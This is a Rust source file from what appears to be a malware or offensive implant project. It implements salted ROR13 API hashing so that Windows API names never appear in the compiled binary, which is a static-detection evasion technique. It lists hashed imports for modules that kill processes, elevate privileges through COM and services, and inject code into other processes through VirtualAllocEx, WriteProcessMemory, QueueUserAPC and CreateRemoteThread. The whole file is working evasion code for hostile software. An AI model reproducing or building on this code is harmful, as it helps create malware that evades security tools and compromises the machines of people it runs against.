// API hashing — ROR13 with a per-build XOR salt so hashes differ every compilation.
//
// HASH_SALT is injected by build.py into api_hash_salt.rs (auto-generated, gitignored).
// All hash constants are const, so the compiler emits only u32 literals — no API name
// string ever appears in any segment of the binary.

include!(concat!(env!("OUT_DIR"), "/api_hash_salt.rs"));

// ROR13 additive hash (industry standard, used by Metasploit/CS shellcode).
// Evaluated entirely at compile time when called with a literal byte-string.
pub const fn ror13(name: &[u8]) -> u32 {
    let mut hash: u32 = 0;
    let mut i = 0;
    while i < name.len() {
        hash = (hash >> 13) | (hash << (32 - 13));
        hash = hash.wrapping_add(name[i] as u32);
        i += 1;
    }
    hash
}

// Salted variant: XOR the final ROR13 hash with the per-build salt so every build
// produces distinct u32 constants even for the same API name.
pub const fn api_hash(name: &[u8]) -> u32 {
    ror13(name) ^ HASH_SALT
}

// ── kernel32.dll ──────────────────────────────────────────────────────────────
pub const H_KERNEL32:                   u32 = api_hash(b"kernel32.dll");
pub const H_NTDLL:                      u32 = api_hash(b"ntdll.dll");
pub const H_OLE32:                      u32 = api_hash(b"ole32.dll");
pub const H_OLEAUT32:                   u32 = api_hash(b"oleaut32.dll");
pub const H_ADVAPI32:                   u32 = api_hash(b"advapi32.dll");

// ── kill.rs ───────────────────────────────────────────────────────────────────
pub const H_CreateToolhelp32Snapshot:   u32 = api_hash(b"CreateToolhelp32Snapshot");
pub const H_Process32FirstW:            u32 = api_hash(b"Process32FirstW");
pub const H_Process32NextW:             u32 = api_hash(b"Process32NextW");
pub const H_OpenProcess:                u32 = api_hash(b"OpenProcess");
pub const H_TerminateProcess:           u32 = api_hash(b"TerminateProcess");
pub const H_CloseHandle:                u32 = api_hash(b"CloseHandle");
pub const H_MoveFileExW:                u32 = api_hash(b"MoveFileExW");
pub const H_GetModuleFileNameW:         u32 = api_hash(b"GetModuleFileNameW");

// ── elev.rs (ole32 + oleaut32 + advapi32) ─────────────────────────────────────
pub const H_CoInitializeEx:             u32 = api_hash(b"CoInitializeEx");
pub const H_CoUninitialize:             u32 = api_hash(b"CoUninitialize");
pub const H_CoCreateInstance:           u32 = api_hash(b"CoCreateInstance");
pub const H_CoSetProxyBlanket:          u32 = api_hash(b"CoSetProxyBlanket");
pub const H_SysAllocStringByteLen:      u32 = api_hash(b"SysAllocStringByteLen");
pub const H_SysFreeString:              u32 = api_hash(b"SysFreeString");
pub const H_SysStringByteLen:           u32 = api_hash(b"SysStringByteLen");
pub const H_OpenSCManagerW:             u32 = api_hash(b"OpenSCManagerW");
pub const H_OpenServiceW:               u32 = api_hash(b"OpenServiceW");
pub const H_StartServiceW:              u32 = api_hash(b"StartServiceW");
pub const H_CloseServiceHandle:         u32 = api_hash(b"CloseServiceHandle");
pub const H_AddVectoredExceptionHandler: u32 = api_hash(b"AddVectoredExceptionHandler");

// ── dynapi.rs (inject crate — kernel32 exports) ───────────────────────────────
pub const H_LoadLibraryA:               u32 = api_hash(b"LoadLibraryA");
pub const H_GetProcAddress:             u32 = api_hash(b"GetProcAddress");
pub const H_VirtualAllocEx:             u32 = api_hash(b"VirtualAllocEx");
pub const H_VirtualFreeEx:              u32 = api_hash(b"VirtualFreeEx");
pub const H_WriteProcessMemory:         u32 = api_hash(b"WriteProcessMemory");
pub const H_QueueUserAPC:               u32 = api_hash(b"QueueUserAPC");
pub const H_ResumeThread:               u32 = api_hash(b"ResumeThread");
pub const H_CreateProcessW:             u32 = api_hash(b"CreateProcessW");
pub const H_WaitForSingleObject:        u32 = api_hash(b"WaitForSingleObject");
pub const H_VirtualProtect:             u32 = api_hash(b"VirtualProtect");
pub const H_CreateRemoteThread:         u32 = api_hash(b"CreateRemoteThread");
pub const H_SetEnvironmentVariableW:    u32 = api_hash(b"SetEnvironmentVariableW");
